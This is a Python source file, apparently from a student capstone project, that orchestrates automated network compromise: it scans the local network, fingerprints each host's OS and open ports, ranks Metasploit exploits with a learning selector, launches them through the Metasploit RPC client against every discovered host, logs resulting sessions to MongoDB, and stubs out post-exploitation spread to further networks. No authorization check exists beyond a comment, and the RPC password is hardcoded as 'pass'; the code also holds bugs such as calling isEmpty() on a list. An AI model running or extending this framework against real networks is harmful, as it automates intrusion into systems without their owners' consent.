import Identifier
import Enricher
import Selector
import Exploiter
from record import Record

from pymongo import MongoClient, ReturnDocument
from metasploit.msfrpc import MsfRpcClient
import json
import time
import copy

def main():
    ### setup
    # check for dependencies - nmap, ms, mongo
    # check for legally scanned network?
    # initialize structures for orchestration
    # connect to database
    # connect to msf rpc
    # initialize exploits + data for selector
    # initialize logging

    dbClient = MongoClient()
    dbRef = dbClient["NetSprawl"]
    netMapTable = dbRef["Map"]
    exploitTable = dbRef["Exploits"] # TODO export weights from Selector

    msfClient = MsfRpcClient("pass")

    hostCollection = []
    rootHost = None

    enrichQueue = []
    exploitQueue = []
    postexQueue = []

    strategy = Selector.defaultStrategy(Exploiter.getExploitNames())

    log_file = open("ophio_log.txt", 'a') # TODO proper logging library, use throughout


    while True:
        ### identifier
        # call scanCurrentNetwork on initial host
        # log results of scan
        # identify root node
        # add host records to database

        # can skip if prev cycle identified new hosts
        print("Identifying...")
        if len(enrichQueue) == 0:
            identifyResults = json.loads(Identifier.scanCurrentNetwork())
            rootInterfaces = []
            hostsDiscovered = []
            for network in identifyResults:
                rootInterfaces.append(network["network"])
                for hostIp in network["hosts"]:
                    hostsDiscovered.append(hostIp)

        if rootHost == None:
            rootHost = Record(rootInterfaces, None)
            rootHost.exploitStatus["statusCode"] = Record.STATUS_SUCCESS
            rootHost.exploitStatus["exploitUsed"] = "N/A"
            record = rootHost.toDict()
            netMapTable.insert(record)
            rootHost.id = record["_id"]
            hostCollection.append(rootHost)
            enrichQueue.append(rootHost)

        for hostIp in hostsDiscovered:
            # TODO check for duplicates first

            hostRecord = Record([hostIp], rootHost.id)
            record = hostRecord.toDict()
            netMapTable.insert(record)
            hostRecord.id = record["_id"]
            hostCollection.append(hostRecord)
            enrichQueue.append(hostRecord)


        ### enricher
        # call scanHostsForInfo on list of hosts, excluding self
        # log results of scans
        # append information to host records in database

        print("Enriching...")
        while len(enrichQueue) > 0:
            hostRecord = enrichQueue.pop()
            if(hostRecord.interfaces == '[]'):
                print("No Interfaces found")
                return
            enrichResults = json.loads(Enricher.scanHostsForInfo(hostRecord.interfaces)[0])
            # TODO concatenate results if there are multiple interfaces on a host
            hostRecord.os = enrichResults[0]
            hostRecord.openPorts = enrichResults[1:] if len(enrichResults) > 1 else []
            netMapTable.update(
                {'_id': hostRecord.id},
                {'$set':
                    {
                        'os': hostRecord.os,
                        'openPorts': hostRecord.openPorts
                    }
                 }
            )
            exploitQueue.append(hostRecord)



        ### selector/exploiter
        # call search on enriched host data
        # attempt exploits in recommended order
        # log results and update selector after each exploit run
        # append exploit status (exploit used, MS session) to host records

        print("Exploiting...")
        while len(exploitQueue) > 0:
            hostRecord = exploitQueue.pop()
            localIp = rootHost.interfaces[0]
            targetIp = hostRecord.interfaces[0]
            hostData = copy.copy(hostRecord.openPorts)
            hostData.insert(0, hostRecord.os)
            # print(hostRecord.toDict()) #debug
            exploitOrder = strategy.search(hostData)

            for exploit in exploitOrder:
                exploitResults = Exploiter.callExploit(msfClient, exploit, targetIp, localIp)
                exploitSuccess = exploitResults["job_id"] != None
                strategy.update(hostData, exploit, exploitSuccess) # TODO from Bill this thows an error "  File "/home/student/UGradCapstoneProject6/src/Selector/strategies/portNums.py", line 29, in update for port in target_data["ports"]:TypeError: list indices must be integers or slices, not str
                if exploitSuccess:
                    break

            if exploitResults["job_id"] == None:
                hostRecord.exploitStatus["statusCode"] = Record.STATUS_FAILURE
            else:
                hostRecord.exploitStatus = {
                    "statusCode": Record.STATUS_SUCCESS,
                    "exploitUsed": exploitResults["uuid"], # TODO nab exploit name too/instead
                    "msSessionId": exploitResults["job_id"]
                }
            print(hostRecord)
            # TODO make sure this update works
            netMapTable.update(
                {'_id': hostRecord.id},
                {'$set':
                    {
                        "exploitStatus": hostRecord.exploitStatus
                    }
                }
            )
            postexQueue.append(hostRecord)



        ### post-exploits
        # drop and run identifier on exploited boxes
        # add new hosts to records + database
        # enrich and exploit new hosts as usual

        print("Postexploiting...")
        while len(postexQueue) > 0:
            hostRecord = postexQueue.pop()
            print(hostRecord)
            # TODO modify networking as needed
            # TODO scan for new hosts
            # add results to



        ### repetition
        # identifiers should be rerun periodically to identify new hosts
        # alternative: run once, and restore state from DB info on startup
        print("Reached end of cycle.")
        if enrichQueue.isEmpty():
            print("Nothing new to scan. Sleeping.")
            time.sleep(60)



        ### logging and reporting
        # writing activities to a log file from lifecycle is a decent start
        # function (seperate script?) to produce report on network map & status from memory state or db records

if __name__ == '__main__':
    main()
